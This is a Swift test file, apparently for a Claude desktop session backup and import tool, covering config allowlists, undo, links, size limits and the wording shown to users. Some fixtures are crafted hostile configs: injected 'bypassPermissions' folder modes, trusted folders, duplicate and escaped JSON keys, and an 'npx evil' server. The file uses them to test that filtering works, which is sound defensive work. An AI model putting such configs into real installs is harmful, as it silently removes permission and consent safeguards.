        j["preferences"] = foreignPrefs.merging(["epitaxyPrefs": ["epitaxy-folder-permission-mode-v2.\(sid(3))": ["/w/project": "bypassPermissions"]]]) { a, _ in a }
        try setConfig(&m, p, try JSONSerialization.data(withJSONObject: j))
        if let i = m.items.firstIndex(where: { $0.role == .config }) { m.items[i].part = "all but preferences.epitaxyPrefs" }    // as an older build labelled it
        // and its sidebar records whole, as an older build carried them: folder permission modes and a later key beside the two
        let sb = p.appendingPathComponent("sidebar/epitaxyPrefs.json")
        var old = (try? JSONSerialization.jsonObject(with: Data(contentsOf: sb))) as? [String: Any] ?? [:]
        old["epitaxy-folder-permission-mode-v2.\(sid(3))"] = ["/w/project": "bypassPermissions"]; old["epitaxyFutureKey2099"] = ["grantedEverything": true]
        let oldData = try JSONSerialization.data(withJSONObject: old)
        try oldData.write(to: sb)
        if let i = m.items.firstIndex(where: { $0.role == .sidebar }) { m.items[i].bytes = Int64(oldData.count) }
    }
    if withSidebar == "OPENED", let os = try? SessionsImport.open(URL(fileURLWithPath: out + "/\(sidebarName).dmg"), password: pw, place: place) {
        let (tS, dS, _) = target("s")
        let stS = try! SessionsImport.materialize(os, part: os.parts[0], target: "s")
        let bS = try! SessionsImport.commit(stS)
        let pS = SessionsRestore.plan(tS, bS, addConfig: true)
        // the staged backup keeps the old sidebar file as it came; what a restore reads of it is the two keys alone
        let oldSidebar = json(fm.contents(atPath: bS.dir.appendingPathComponent("sidebar/epitaxyPrefs.json").path)) ?? [:]
        check(oldSidebar.keys.contains { $0.hasPrefix("epitaxy-folder-permission-mode") } && Set(SessionsBackup.sidebarAllowed(oldSidebar).keys) == SessionsBackup.sidebarAllowlist
              && sidebarOnly(SessionsBackup.sidebarData(fm.contents(atPath: bS.dir.appendingPathComponent("sidebar/epitaxyPrefs.json").path) ?? Data())),
              "old image (read side): its sidebar records with permission modes and a later key give the sections and groups alone: \(oldSidebar.keys.sorted())")
        check(pS.config.present && pS.config.otherKeys == ["coworkUserFilesPath", "futureTopLevelKey2099", "globalShortcut", "preferences"]
              && pS.configPieces.count == 1 && allowlistOnly(pS.configPieces[0].data) && WindowWords.config(pS.config) == "2 MCP servers"
              && WindowWords.otherKeys(pS.config) == "Never added: the window's other settings it holds (coworkUserFilesPath, futureTopLevelKey2099, globalShortcut, preferences; values not shown). Only the MCP servers come: permission and consent settings and another Mac's paths never move.",
              "old image (read side): the plan writes the MCP servers alone and names the rest as never added: \(pS.config.otherKeys)")
        // an export from that backup (the staged copy keeps the old file as it came) is filtered again: the new image holds the allowlist alone
        let fromOld = URL(fileURLWithPath: out + "/S-from-old.dmg")
        let partS = SessionsExport.Part(profile: "s", name: "S", backup: bS)
        check(SessionsExport.preview(partS)?.config.servers == ["github", "remote"], "old image: an export from its backup lists the 2 servers")
        if (try? SessionsExport.run(SessionsExport.Job(parts: [partS], keys: .leaveOut, password: pw, destination: fromOld, rootName: "s-from-old", place: place))) != nil,
           let oo = try? SessionsImport.open(fromOld, password: pw, place: place) {
            check(allowlistOnly(fm.contents(atPath: oo.tree.path + "/profiles/p1/config/claude_desktop_config.json")),
                  "old image: an export made from its backup carries the allowlist alone (write side filters again)")
            check(sidebarOnly(fm.contents(atPath: oo.tree.path + "/profiles/p1/sidebar/epitaxyPrefs.json")),
                  "old image: an export made from its backup carries the sidebar's sections and groups alone (its permission modes filtered again)")
            SessionsImport.discard(oo.work)
        } else { check(false, "old image: an export from its backup is made and opens") }
        let rS = try? SessionsRestore.run(tS, bS, addConfig: true, windowClosed: { true })
        let gotData = fm.contents(atPath: dS + "/claude_desktop_config.json")
        check(rS?.configAdded == true && allowlistOnly(gotData),
              "old image (read side): restore/import writes the MCP servers alone: no permission opt-in, trusted folder, consent, path of the other Mac, sidebar part or later key")
        let got = json(gotData)
        defer {
            // the window rewrites the file when it opens (its sidebar step): Undo then leaves it, and says so in the words the row reads
            write(dS + "/claude_desktop_config.json", #"{"mcpServers":{"x":{"command":"x"}},"preferences":{"epitaxyPrefs":{}}}"#)
            if let id = rS?.id, let u = try? SessionsRestore.undo(id, windowClosed: { true }) {
                check(u.problems.contains(WindowWords.configChangedProblem) && fm.fileExists(atPath: dS + "/claude_desktop_config.json")
                      && WindowWords.configDone(SessionsRestore.ConfigPlan(), added: true, undone: true, name: "S", imported: true, leftByUndo: true).contains("Undo left the file as it is"),
                      "undo: a config the window changed since is left, and the row says so: \(u.problems)")
            } else { check(false, "undo: the import with a config can be undone") }
        }
        check(got?["mcpServers"] != nil && got?["preferences"] == nil && !(read(dS + "/claude_desktop_config.json") ?? "permission-mode").contains("permission-mode"),
              "hostile (image): a config carrying the sidebar part (folder permission modes) is written without it")
        SessionsImport.discard(os.work)
    } else { check(false, "hostile (image): the old-image config opens: \(withSidebar.prefix(80))") }

    // an image whose config holds nothing on the allowlist (only keys off it, or an empty mcpServers): nothing is written, even on
    // "Add them", and the row says the file holds no MCP servers
    let offName = "w-config-off-list"
    let offImage = doctored(offName) { m, _, p in try setConfig(&m, p, try JSONSerialization.data(withJSONObject: offList.merging(["mcpServers": [String: Any]()]) { a, _ in a })) }
    if offImage == "OPENED", let oo = try? SessionsImport.open(URL(fileURLWithPath: out + "/\(offName).dmg"), password: pw, place: place) {
        let (tO, dO, _) = target("o")
        let stO = try! SessionsImport.materialize(oo, part: oo.parts[0], target: "o")
        let bO = try! SessionsImport.commit(stO)
        let pO = SessionsRestore.plan(tO, bO, addConfig: true)
        check(!pO.config.present && pO.configPieces.isEmpty && pO.config.leftOutAtSource == "it holds no MCP servers"
              && WindowWords.configValue(pO.config, name: "O", imported: true) == "not in the file: the file holds no MCP servers",
              "off-list image (read side): nothing to add, and the row says so: \(WindowWords.configValue(pO.config, name: "O", imported: true))")
        let rO = try? SessionsRestore.run(tO, bO, addConfig: true, windowClosed: { true })
        check(rO != nil && rO?.configAdded == false && !fm.fileExists(atPath: dO + "/claude_desktop_config.json"), "off-list image: Add them writes no claude_desktop_config.json")
        if let id = rO?.id { _ = try? SessionsRestore.undo(id, windowClosed: { true }) }
        SessionsImport.discard(oo.work)
    } else { check(false, "off-list image: opens: \(offImage.prefix(80))") }

    // read side, crafted JSON text: a duplicate key, an escaped key name, a value that isn't an object. Whatever the parser makes of
    // them, what "Add them" writes is the allowlist alone, and the servers the row lists are exactly the ones written
    /// The servers the plan lists and the file "Add them" writes, for an image whose config is `text` (an image the import refuses
    /// as not a JSON object writes nothing: listed none, written nil).
    func craftedRead(_ name: String, _ text: String) -> (listed: [String], written: Data?)? {
        let opened = doctored(name, edit: { m, _, p in try setConfig(&m, p, Data(text.utf8)) })
        if opened.contains("isn't a JSON object") { return ([], nil) }
        guard opened == "OPENED", let o = try? SessionsImport.open(URL(fileURLWithPath: out + "/\(name).dmg"), password: pw, place: place) else { return nil }
        defer { SessionsImport.discard(o.work) }
        let (tC, dC, _) = target("c-\(name)")
        guard let st = try? SessionsImport.materialize(o, part: o.parts[0], target: "c-\(name)"), let b = try? SessionsImport.commit(st) else { return nil }
        let listed = SessionsRestore.plan(tC, b, addConfig: true).config.servers.map(\.name)
        let r = try? SessionsRestore.run(tC, b, addConfig: true, windowClosed: { true })
        let written = fm.contents(atPath: dC + "/claude_desktop_config.json")
        if let id = r?.id { _ = try? SessionsRestore.undo(id, windowClosed: { true }) }
        return (listed, written)
    }
    func onlyServers(_ d: Data?) -> [String]? {
        guard let d, let j = json(d), Set(j.keys) == SessionsBackup.configAllowlist, let text = String(data: d, encoding: .utf8),
              !foreignMarks.contains(where: { text.contains($0) }), !text.contains("evil") else { return nil }
        return (j["mcpServers"] as? [String: Any])?.keys.sorted()
    }
    if let dup = craftedRead("w-config-dup", #"{"mcpServers":{"a":{"command":"x"}},"preferences":{"bypassPermissionsGateByAccount":{"k":true}},"mcpServers":{"b":{"command":"y"}},"preferences":"evil"}"#) {
        check(dup.written == nil ? dup.listed.isEmpty : onlyServers(dup.written).map { $0 == dup.listed && ($0 == ["a"] || $0 == ["b"]) } == true,
              "crafted (read side): a duplicate mcpServers or preferences key: one server object at most is written, the one listed, and nothing else: \(dup.listed)")
    } else { check(false, "crafted (read side): the duplicate-key image opens and stages") }
    // the key names written with JSON escapes in the file's bytes (a backslash, then u0053 for S, u0065 for e), so the parser decodes them
    let bs = String(UnicodeScalar(92))
    let escapedText = #"{"mcp"# + bs + #"u0053ervers":{"esc":{"command":"x"}},"pref"# + bs + #"u0065rences":{"bypassPermissionsOptInByAccount":{"k":true}},""# + bs + #"u0065vil":1}"#
    check(escapedText.contains(bs + "u0053ervers") && !escapedText.contains("mcpServers") && !escapedText.contains("preferences"), "crafted: the escaped file really holds the escapes")
    if let esc = craftedRead("w-config-escaped", escapedText) {
        check(onlyServers(esc.written) == ["esc"] && esc.listed == ["esc"],
              "crafted (read side): an escaped key name is the key it spells: mcpServers comes, an escaped preferences or other key never does")
    } else { check(false, "crafted (read side): the escaped-key image opens and stages") }
    if let notObject = craftedRead("w-config-not-object", #"{"mcpServers":["npx evil"],"preferences":{"localAgentModeTrustedFolders":["/w/x"]}}"#) {
        check(notObject.written == nil && notObject.listed.isEmpty, "crafted (read side): a mcpServers that isn't an object writes nothing and lists nothing")
    } else { check(false, "crafted (read side): the non-object image opens and stages") }

    // a task file of 300,000 tasks and a config of 100,000 servers: the plan keeps the first 200 of each for the page (and counts the
    // rest), and is made in a moment
    let hugeName = "w-huge-lists"
    let hugeLists = doctored(hugeName) { m, _, p in
        guard let it = m.items.first(where: { $0.role == .window && $0.path.hasSuffix("/scheduled-tasks.json") }) else { return }
        var list = SessionsRestore.taskList(try Data(contentsOf: p.appendingPathComponent(it.path))) as [Any]
        for i in 0..<300_000 { list.append(["id": "t\(i)", "displayName": "Task \(i)", "filePath": "/x/scheduled-tasks/t\(i)/SKILL.md"]) }
        let data = try JSONSerialization.data(withJSONObject: ["scheduledTasks": list])
        try data.write(to: p.appendingPathComponent(it.path))
        if let i = m.items.firstIndex(where: { $0.path == it.path }) { m.items[i].bytes = Int64(data.count) }
        var servers: [String: Any] = [:]
        for i in 0..<100_000 { servers["s\(i)"] = ["command": "x"] }
        try setConfig(&m, p, try JSONSerialization.data(withJSONObject: ["mcpServers": servers]))
    }
    if hugeLists == "OPENED", let oh = try? SessionsImport.open(URL(fileURLWithPath: out + "/\(hugeName).dmg"), password: pw, place: place) {
        let (tH, _, _) = target("h")
        let stH = try! SessionsImport.materialize(oh, part: oh.parts[0], target: "h")
        let t0 = Date()
        let pH = SessionsRestore.plan(tH, stH.backup, addConfig: true, addTasks: true)
        let took = Date().timeIntervalSince(t0)
        check(pH.taskPlan.tasks.count == 200 && pH.taskPlan.moreTasks == 300_004 - 200 && pH.config.servers.count == 200 && pH.config.moreServers == 99_800
              && WindowWords.taskLines(pH.taskPlan).count <= 202 && WindowWords.config(pH.config).contains("100000 MCP servers") && took < 60,
              "huge lists: the plan keeps 200 tasks and 200 servers for the page and counts the rest, in \(String(format: "%.1f", took)) s")
        SessionsImport.discard(oh.work)
    } else { check(false, "huge lists: the image opens: \(hugeLists.prefix(80))") }

    // ---- names like an entry that aren't one (ClaudeFiles' one rule): a backup copies them and says "other files"; an export leaves them out, said
    do {
        let dataO = w + "/Claude-o", codeO = w + "/.claude-o"
        let scopeO = "\(dataO)/claude-code-sessions/\(sid(1))/\(sid(2))"
        write("\(scopeO)/local_\(sid(20)).json", #"{"sessionId":"local_\#(sid(20))","cliSessionId":"\#(sid(120))","title":"real","isArchived":false}"#)
        write("\(scopeO)/local_notanid.json", #"{"sessionId":"local_notanid"}"#)                 // not an id: not an entry
        write("\(scopeO)/notes.txt", "a stray file\n")                                           // not the window's own
        write("\(scopeO)/archived-sessions.idx", "idx\n")                                        // the window's own index
        write("\(scopeO)/deleted_\(sid(21))", "")                                                // the window's own marker
        write(w + "/elsewhere-o.json", "{}")
        symlink(w + "/elsewhere-o.json", "\(scopeO)/local_\(sid(22)).json")                    // a link: never taken at all
        write("\(codeO)/CLAUDE.md", "# rules\n")
        let srcO = SessionsBackup.Source(profile: "o", dataDir: dataO, codeDir: codeO)
        let bO = try! SessionsBackup.make(srcO, kind: .manual, place: place)
        check(bO.counts.sessions == 1 && SessionsBackup.otherFiles(bO) == 2 && SessionsBackup.summary(bO).hasPrefix("1 session · 2 other files · "),
              "backup: everything plain copied, the entries counted as sessions, the rest said as other files (not the index or a marker): \(SessionsBackup.summary(bO))")
        check(!SessionsBackup.summary(bA).contains("other file"), "backup: no other files, no words for them: \(SessionsBackup.summary(bA))")
        var oldO = bO; oldO.counts.sessions = 2                 // a backup of 26.11.42 or earlier counted the odd name as a session
        check(SessionsBackup.summary(oldO).hasPrefix("1 session · 2 other files · "), "backup (older count): the sessions counted from its items by the one rule: \(SessionsBackup.summary(oldO))")
        let partO = SessionsExport.Part(profile: "o", name: "O", source: srcO, emails: [])
        let pvO = SessionsExport.preview(partO)!
        check(pvO.entries == 1 && pvO.notEntries == 1 && ExportWords.notEntriesNote(pvO) == "1 file left out: named like a Code-tab entry, but not a Code-tab session."
              && ExportWords.notEntriesNote(pv) == nil,
              "export preview: the one entry; the name like one that isn't, left out and said: \(ExportWords.notEntriesNote(pvO) ?? "none")")
        let zipO = URL(fileURLWithPath: out + "/O.zip")
        if let oo = try? SessionsExport.run(SessionsExport.Job(parts: [partO], keys: .leaveOut, destination: zipO, rootName: "o-export", place: place)),
           let opened = try? SessionsImport.open(zipO, password: nil, place: place) {
            let mo = opened.parts[0].manifest
            let names = mo.items.filter { $0.role == .window }.map { ($0.path as NSString).lastPathComponent }
            check(oo.notEntriesLeftOut == 1 && mo.counts.sessions == 1 && mo.leftOut == 1 && !names.contains("local_notanid.json") && !names.contains("notes.txt")
                  && names.contains("local_\(sid(20)).json"),
                  "export (zip): the entry in, the name like one left out and counted: \(names)")
            check(ExportWords.notEntriesDone(oo) == "1 file left out: named like a Code-tab entry, but not a Code-tab session." && ExportWords.notEntriesDone(zo!) == nil,
                  "export result page: the same left-out line once the file is made, none when nothing was: \(ExportWords.notEntriesDone(oo) ?? "none")")
            SessionsImport.discard(opened.work)
        } else { check(false, "export (zip) of the odd names: made and opens") }
        try? fm.removeItem(atPath: dataO); try? fm.removeItem(atPath: codeO)
    }

    // ---- the window's own folders (backlog/, waiting-input/): a backup takes their plain files (apart, the format as it was); a restore puts each back only where none is
    do {
        let dataF = w + "/Claude-wf", codeF = w + "/.claude-wf"          // not "-f": the import (zip) section's target("f") leaves its own there
        let scopeF = "\(dataF)/claude-code-sessions/\(sid(1))/\(sid(2))"
        let backlog = #"{"version":1,"items":[{"id":"b1","text":"later"}]}"#
        write("\(scopeF)/local_\(sid(30)).json", #"{"sessionId":"local_\#(sid(30))","cliSessionId":"\#(sid(130))","isArchived":false}"#)
        write("\(scopeF)/backlog/tasks.json", backlog)
        write("\(scopeF)/waiting-input/w1.json", "{}")
        write("\(scopeF)/waiting-input/deeper/x.json", "{}")                                 // one level only
        write(w + "/elsewhere-f.json", "{}")
        symlink(w + "/elsewhere-f.json", "\(scopeF)/waiting-input/link.json")                 // a link: never taken
        write("\(codeF)/CLAUDE.md", "# rules\n")
        let srcF = SessionsBackup.Source(profile: "f", dataDir: dataF, codeDir: codeF)
        let bF = try! SessionsBackup.make(srcF, kind: .manual, place: place)
        // an export of that profile carries none of it, and its own import opens it (the guard never refuses a real export)
        let zipF = URL(fileURLWithPath: out + "/F.zip")
        do {
            _ = try SessionsExport.run(SessionsExport.Job(parts: [SessionsExport.Part(profile: "f", name: "F", source: srcF, emails: [])], keys: .leaveOut,
                                                          destination: zipF, rootName: "f-export", place: place))
            let o = try SessionsImport.open(zipF, password: nil, place: place)
            let mo = o.parts[0].manifest
            check(mo.windowExtra == nil && !mo.items.contains { $0.path.contains("backlog") || $0.path.contains("waiting-input") },
                  "export: a profile with a backlog and waiting input exports without them, and its own import opens the file")
            SessionsImport.discard(o.work)
        } catch { check(false, "export of a profile with a backlog: made and opens: \(error)") }
        let folderPaths = (bF.windowExtra ?? []).map(\.path).sorted()
        let bFdir = SessionsBackup.folder(profile: "f", place: place).appendingPathComponent(bF.id).path
        check(bF.version == 2 && folderPaths == ["window-extra/\(sid(1))/\(sid(2))/backlog/tasks.json", "window-extra/\(sid(1))/\(sid(2))/waiting-input/w1.json"]
              && !bF.items.contains { $0.path.hasPrefix("window-extra/") } && read(bFdir + "/window-extra/\(sid(1))/\(sid(2))/backlog/tasks.json") == backlog
              && SessionsBackup.otherFiles(bF) == 0 && SessionsBackup.summary(bF).hasPrefix("1 session · backlog · waiting input · "),
              "backup: the backlog and the waiting input's plain files, one level, never a link, apart from the items; the format as it was: \(folderPaths) version \(bF.version) other \(SessionsBackup.otherFiles(bF)) summary \(SessionsBackup.summary(bF)) items \(bF.items.map { "\($0.role):\($0.path)" }) backlogRead \(read(bFdir + "/window-extra/\(sid(1))/\(sid(2))/backlog/tasks.json") == backlog)")
        // a reader that doesn't know them (26.11.43's Manifest: no windowExtra key) decodes the same file and sees the rest only
        struct OlderItem: Decodable { var path: String }
        struct OlderManifest: Decodable { var version: Int; var items: [OlderItem] }
        let older = try? JSONDecoder().decode(OlderManifest.self, from: fm.contents(atPath: bFdir + "/backup.json")!)
        check(older?.version == 2 && older?.items.allSatisfy { !$0.path.hasPrefix("window-extra/") } == true,
              "backup: an older reader decodes it (the extra key ignored) and finds only what it knows: older version \(older?.version as Any) decoded \(older != nil)")
        // restore: missing here, put back (only those), Undo takes them back
        let tF = SessionsRestore.Target(profile: "f", dataDir: dataF, codeDir: codeF, inUse: seatA)
        let bkF = SessionsRestore.Backup(profile: "f", id: bF.id, place: place)
        try? fm.removeItem(atPath: scopeF + "/backlog"); try? fm.removeItem(atPath: scopeF + "/waiting-input/w1.json")
        let pf = SessionsRestore.plan(tF, bkF)
        check(pf.refusal == nil && pf.folderFiles.map(\.leaf).sorted() == ["tasks.json", "w1.json"] && pf.entries.isEmpty && pf.windowNeeded
              && SessionsRestore.folderFilesWords(pf) == "the Code-tab backlog and 1 waiting-input file",
              "restore: the two missing files of the window's folders come back: \(pf.refusal ?? "ok") \(pf.folderFiles.map(\.leaf))")
        let rf = try! SessionsRestore.run(tF, bkF, windowClosed: { true })
        check(read(scopeF + "/backlog/tasks.json") == backlog && fm.fileExists(atPath: scopeF + "/waiting-input/w1.json"), "restore: put back as they were")
        _ = try! SessionsRestore.undo(rf.id, windowClosed: { true })
        check(!fm.fileExists(atPath: scopeF + "/backlog") && !fm.fileExists(atPath: scopeF + "/waiting-input/w1.json") && fm.fileExists(atPath: scopeF + "/waiting-input/deeper/x.json"),
              "restore: Undo takes them back, and the folder it made")
        // one that is there stays as it is, whatever it holds
        write("\(scopeF)/backlog/tasks.json", #"{"version":1,"items":[]}"#)
        let pf2 = SessionsRestore.plan(tF, bkF)
        check(pf2.folderFiles.map(\.leaf) == ["w1.json"] && pf2.folderFilesThere == 1 && SessionsRestore.folderFilesWords(pf2) == "1 waiting-input file"
              && !pf2.notes.contains { $0.contains("backlog") },                 // (counted, as entries back where they were are: no note)
              "restore: a backlog that is here is left as it is; only the missing file comes: \(pf2.folderFiles.map(\.leaf))")
        try? fm.removeItem(atPath: scopeF + "/waiting-input/w1.json"); write("\(scopeF)/waiting-input/w1.json", "{}")
        try? fm.removeItem(atPath: scopeF + "/backlog")
        let pf3 = SessionsRestore.plan(tF, bkF)
        check(SessionsRestore.folderFilesWords(pf3) == "the Code-tab backlog", "restore page: the backlog alone, by its name")
        // another account's files go back only into that account's own folder: with another account in use, and that one not the
        // profile's, they stay in the backup, said (a switch never moves them)
        let pf5 = SessionsRestore.plan(SessionsRestore.Target(profile: "f", dataDir: dataF, codeDir: codeF, inUse: SeatID(account: sid(3), organization: sid(4))), bkF)
        check(pf5.folderFiles.isEmpty && pf5.notes.contains { $0.hasPrefix("2 files of the window's backlog or waiting input belong to an account this profile doesn't use, or whose folder isn't here") },
              "restore: another account's backlog never lands in the account in use's folder: \(pf5.notes)")
        // …and with that account one of the profile's, whose folder is here: into its own folder
        let pf6 = SessionsRestore.plan(SessionsRestore.Target(profile: "f", dataDir: dataF, codeDir: codeF, inUse: SeatID(account: sid(3), organization: sid(4)), seats: [seatA]), bkF)
        check(pf6.folderFiles.map(\.dest) == ["claude-code-sessions/\(sid(1))/\(sid(2))/backlog/tasks.json"],
              "restore: a backlog of one of the profile's accounts goes back into that account's own folder: \(pf6.folderFiles.map(\.dest))")
        // a backlog that is a file, a waiting input that is a dangling link: left as they are, nothing planned through them
        write(scopeF + "/backlog", "not a folder")
        try? fm.removeItem(atPath: scopeF + "/waiting-input"); symlink(w + "/nowhere-f", scopeF + "/waiting-input")
        let pf4 = SessionsRestore.plan(tF, bkF)
        check(pf4.refusal == nil && pf4.folderFiles.isEmpty && pf4.folderFilesThere == 0
              && pf4.notes.contains("The window's backlog folder is a link or a file here: its files stay in the backup.")
              && pf4.notes.contains("The window's waiting-input folder is a link or a file here: its files stay in the backup."),
              "restore: a folder that is a file or a link: its files are left, nothing written through it: \(pf4.folderFiles.map(\.dest))")
        try? fm.removeItem(atPath: scopeF + "/backlog"); try? fm.removeItem(atPath: scopeF + "/waiting-input")
        // a folder made a link after the plan (the first window check of the run comes after it): that file is left, said, and the
        // run goes on (never a stop that leaves a restore half way); nothing is written through the link
        let away = w + "/away-f"
        try? fm.removeItem(atPath: away); try! fm.createDirectory(atPath: away, withIntermediateDirectories: true)
        var swapped = false
        let rs = try? SessionsRestore.run(tF, bkF, windowClosed: {
            if !swapped { swapped = true; symlink(away, scopeF + "/backlog") }
            return true
        })
        check(swapped && rs?.problems.contains("backlog/tasks.json: its folder is a link or can't be made; left as it is.") == true
              && fm.fileExists(atPath: scopeF + "/waiting-input/w1.json") && ((try? fm.contentsOfDirectory(atPath: away)) ?? ["?"]).isEmpty,
              "restore: a folder made a link mid-run: its file left and said, the rest written, nothing through the link: \(rs?.problems ?? ["no receipt"])")
        if let rs { _ = try? SessionsRestore.undo(rs.id, windowClosed: { true }) }
        try? fm.removeItem(atPath: scopeF + "/backlog"); try? fm.removeItem(atPath: scopeF + "/waiting-input")
        // over 64 MB: a backup never takes one (counted as left out), and a restore refuses a backup that holds one
        func sparse(_ path: String, _ size: UInt64) {
            try? fm.createDirectory(atPath: (path as NSString).deletingLastPathComponent, withIntermediateDirectories: true)
            fm.createFile(atPath: path, contents: nil)
            if let h = FileHandle(forWritingAtPath: path) { try? h.truncate(atOffset: size); try? h.close() }
        }
        let bSmall = try! SessionsBackup.make(srcF, kind: .manual, place: place)        // the baseline: the same folders without it
        sparse(scopeF + "/waiting-input/big.json", (64 << 20) + 1)
        write(scopeF + "/waiting-input/small.json", "{}")
        let bBig = try! SessionsBackup.make(srcF, kind: .manual, place: place)
        let bigPaths = (bBig.windowExtra ?? []).map { ($0.path as NSString).lastPathComponent }
        check(bigPaths.contains("small.json") && !bigPaths.contains("big.json") && bBig.leftOut == bSmall.leftOut + 1,
              "backup: a file over 64 MB in the waiting input is never taken, counted as left out; the small one beside it is: \(bigPaths) \(bSmall.leftOut)→\(bBig.leftOut)")
        try? fm.removeItem(atPath: scopeF + "/waiting-input/big.json"); try? fm.removeItem(atPath: scopeF + "/waiting-input/small.json")
        let inBackup = bFdir + "/window-extra/\(sid(1))/\(sid(2))/waiting-input/w1.json"
        let keepW1 = fm.contents(atPath: inBackup)!
        try? fm.removeItem(atPath: inBackup); sparse(inBackup, (64 << 20) + 1)
        let tooBig = SessionsRestore.plan(tF, bkF).refusal
        try? fm.removeItem(atPath: inBackup); try! keepW1.write(to: URL(fileURLWithPath: inBackup))
        check(tooBig?.contains("over 64 MB") == true, "restore: a backup holding one over 64 MB is refused whole, never read: \(tooBig ?? "nil")")
        // a backup.json whose windowExtra names another folder, or a path outside window-extra: refused whole
        let mPath = SessionsBackup.folder(profile: "f", place: place).appendingPathComponent(bF.id).appendingPathComponent("backup.json").path
        let orig = fm.contents(atPath: mPath)!
        func doctored(_ change: (inout [String: Any]) -> Void) -> String? {
            var j = json(orig)!; change(&j)
            try! JSONSerialization.data(withJSONObject: j).write(to: URL(fileURLWithPath: mPath))
            defer { try! orig.write(to: URL(fileURLWithPath: mPath)) }
            return SessionsRestore.plan(tF, bkF).refusal
        }
        func extraPaths(_ f: @escaping (String) -> String) -> (inout [String: Any]) -> Void {
            { j in j["windowExtra"] = (j["windowExtra"] as! [[String: Any]]).map { var it = $0; it["path"] = f(it["path"] as! String); return it } }
        }
        let other = doctored(extraPaths { $0.replacingOccurrences(of: "/waiting-input/", with: "/elsewhere/") })
        let outside = doctored(extraPaths { $0.replacingOccurrences(of: "window-extra/", with: "window/") })
        let signIn = doctored(extraPaths { $0.replacingOccurrences(of: "/w1.json", with: "/credentials.json") })
        let asImport = doctored { $0["kind"] = ["type": "imported", "file": "x.zip"] }
        check([other, outside, signIn, asImport].allSatisfy { $0?.contains("a place it doesn't keep them") == true },
              "restore: windowExtra naming another folder, a path outside window-extra, a sign-in name, or in an imported backup refuses the whole backup: \([other, outside, signIn, asImport].map { $0 ?? "nil" })")
        try? fm.removeItem(atPath: dataF); try? fm.removeItem(atPath: codeF)
    }

    // ---- the older rules refuse version 3: 26.11.7 reads `version == 1`, 26.11.8 `<= 2`; and a reader without the config role can't decode it
    let v3 = oi.parts[0].manifest.version
    check(v3 == 3 && !(v3 == 1) && !(v3 <= 2), "format: this build writes 3, which 26.11.7's guard (== 1) and 26.11.8's (<= 2) refuse")
    enum OldRole: String, Codable { case window, sidebar, record, transcript, setup }
    struct OldItem: Codable { var role: OldRole; var path: String }
    struct OldManifest: Codable { var version: Int; var items: [OldItem] }
    check((try? JSONDecoder().decode(OldManifest.self, from: fm.contents(atPath: oi.tree.path + "/profiles/p1/backup.json")!)) == nil,
          "format: a backup.json with the config item can't even be decoded by a reader that doesn't know the role (26.11.8's), so it never reads it half")
    SessionsImport.discard(oi.work)
    try? fm.removeItem(atPath: w)
    resetRestores()
}

// ================================================================== part 2: the rows' words
MainActor.assumeIsolated {
    var cp = SessionsRestore.ConfigPlan()
    cp.present = true; cp.servers = [.init(name: "github", runs: "npx"), .init(name: "remote", runs: "a remote server")]
    check(WindowWords.configValue(cp, name: "Work", imported: true) == "2 MCP servers: left out", "rows: MCP left out by default: \(WindowWords.configValue(cp, name: "Work", imported: true))")
    cp.leftOut = false
    check(WindowWords.configValue(cp, name: "Work", imported: true) == "2 MCP servers: added" && WindowWords.configDone(cp, added: true, undone: false, name: "Work", imported: true) == "added: 2 MCP servers",
          "rows: MCP added, and the done line")
    cp.status = .here; cp.lacking = ["remote"]
    check(WindowWords.configValue(cp, name: "Work", imported: true) == "not added: Work's claude_desktop_config.json stays as it is"
          && WindowWords.configDone(cp, added: false, undone: false, name: "Work", imported: true) == "not added: Work's claude_desktop_config.json stays as it is",
          "rows: a file here stays; the done line says why it wasn't added: \(WindowWords.configDone(cp, added: false, undone: false, name: "Work", imported: true))")
    check(WindowWords.configDone(cp, added: true, undone: true, name: "Work", imported: true) == "2 MCP servers: was added, and taken away again", "rows: after Undo")
    cp.otherKeys = ["globalShortcut", "preferences"]
    let wasLeftOut = cp.leftOut
    for lo in [false, true] {
        cp.leftOut = lo
        check(WindowWords.otherKeys(cp) == "Never added: the window's other settings it holds (globalShortcut, preferences; values not shown). Only the MCP servers come: permission and consent settings and another Mac's paths never move.",
              "rows: the rest of an older file is said never to come (servers \(lo ? "left out" : "added"))")
    }
    cp.leftOut = wasLeftOut
    check(WindowWords.serversKey(cp, imported: true) == ("What the file's servers would run (not added: your claude_desktop_config.json stays)", "Hide (not added: your claude_desktop_config.json stays)"),
          "rows: with a file here, both keys of the servers' list keep the not-added caveat")
    cp.status = .blocked("the profile has no Claude window folder")
    check(WindowWords.serversKey(cp, imported: true).hide == "Hide (not added: it can't be added here)", "rows: …and when it can't be added")
    cp.status = .new
    check(WindowWords.serversKey(cp, imported: true) == ("What each server runs (its command line and env names; env values aren't shown)", "Hide what they run"),
          "rows: a file that is added: the key says once what isn't shown")
    check(WindowWords.tasksKey(1, imported: true) == "Show the tasks (1 can't come)" && WindowWords.tasksKey(1, imported: false) == "Show the tasks (1 without the backup's prompt)" && WindowWords.tasksKey(0, imported: false) == "Show the tasks",
          "rows: the tasks' key: an import's can't come; a restore's all come back, some without the backup's prompt")
    var tp = SessionsRestore.TaskPlan()
    tp.present = true; tp.imported = true
    tp.tasks = [.init(id: "a", name: "Nightly digest", why: nil), .init(id: "b", name: "Bad", why: "its prompt isn't in the file")]; tp.comingCount = 1
    check(WindowWords.tasksValue(tp, imported: true) == "1 task: left out", "rows: tasks left out by default: \(WindowWords.tasksValue(tp, imported: true))")
    tp.leftOut = false
    check(WindowWords.tasksValue(tp, imported: true) == "1 task: added, paused" && WindowWords.taskLines(tp) == ["Nightly digest", "Bad: not added, its prompt isn't in the file"], "rows: tasks added, paused; the list says which can't come and why")
    check(WindowWords.turnOn("the usual Claude app") == "Paused, so a task doesn't run on both Macs. To use one, turn it on with its own switch in Scheduled tasks in the usual Claude app. cl_audit never changes a task after this.",
          "rows: where to turn them on")
    check(WindowWords.tasksDone(["Nightly digest"], undone: false, leftOut: false) == "1 task added, paused: Nightly digest" && WindowWords.tasksDone([], undone: false, leftOut: true) == "none added (left out)"
          && WindowWords.tasksDone(["Nightly digest", "Weekly"], undone: true, leftOut: false) == "2 tasks were added, paused, and taken away again", "rows: the done and undone lines")
    check(WindowWords.tasksDone(Array(repeating: "T", count: 200), count: 300_000, risky: 2, undone: false, leftOut: false) == "300000 tasks added, paused: T, T, T, T, T, …. With permission checks off or approved permissions: 2 (see the list)"
          && WindowWords.tasksDone(["T"], count: 300_000, undone: true, leftOut: false) == "300000 tasks were added, paused, and taken away again",
          "rows: the done line counts all the tasks added and flags the risky ones, not only the 200 listed")
